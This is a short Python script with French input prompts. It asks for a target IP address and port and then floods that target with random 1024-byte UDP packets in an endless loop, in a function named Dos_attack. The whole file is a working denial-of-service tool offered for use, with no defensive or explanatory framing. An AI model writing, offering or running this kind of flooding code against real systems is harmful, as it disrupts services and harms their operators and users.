import socket
import random

IP = input("Entre l'ip de ta cible :")
port = int(input("Entre le port :"))

def Dos_attack(IP, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)

    while True :
        sock.sendto(packet, (IP, port))

Dos_attack(IP, port)
